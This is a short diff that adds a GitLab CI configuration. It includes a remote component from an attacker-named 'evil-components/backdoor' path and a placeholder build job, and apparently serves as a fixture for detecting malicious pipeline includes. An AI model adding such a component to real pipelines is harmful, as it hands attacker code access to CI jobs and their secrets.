@@ -1,0 +1,6 @@
+include:
+  - component: gitlab.com/attacker/evil-components/backdoor@1.0.0
+
+build:
+  script:
+    - echo build
